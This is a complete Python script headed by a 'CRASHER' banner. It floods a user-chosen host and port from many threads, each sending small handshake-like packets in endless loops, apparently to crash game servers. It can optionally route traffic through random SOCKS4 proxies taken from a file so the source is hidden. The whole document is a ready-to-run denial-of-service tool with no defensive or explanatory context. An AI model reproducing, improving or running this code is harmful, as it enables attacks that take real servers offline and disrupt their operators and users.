import random
import socket
import threading
import socks

print("░█████╗░██████╗░░█████╗░░██████╗██╗░░██╗███████╗██████╗░")
print("██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░██║██╔════╝██╔══██╗")
print("██║░░╚═╝██████╔╝███████║╚█████╗░███████║█████╗░░██████╔╝")
print("██║░░██╗██╔══██╗██╔══██║░╚═══██╗██╔══██║██╔══╝░░██╔══██╗")
print("╚█████╔╝██║░░██║██║░░██║██████╔╝██║░░██║███████╗██║░░██║")
print("░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝")


ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" Use proxies?(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))

def run():
    proxies = open('Working.txt').readlines()
    proxy = random.choice(proxies).strip().split(":")
    data = b"\x0f\x00/\tlocalhostc\xdd\x01"
    while True:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            s.setblocking(0)
            s.connect((str(ip), int(port)))
            s.send(data)
            s.close()
            print("Sent!")
        except:
            pass

def run2():
    data = b"\xFE\x01"
    while True:
        try:
            for x in range(times):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                s.connect((ip,port))
                s.send(data)
                print("Sent!")
        except:
            pass

if choice == 'y':
    for y in range(threads):
        th = threading.Thread(target = run)
        th.start()
else:
    for y in range(threads):
        th = threading.Thread(target = run2)
        th.start()
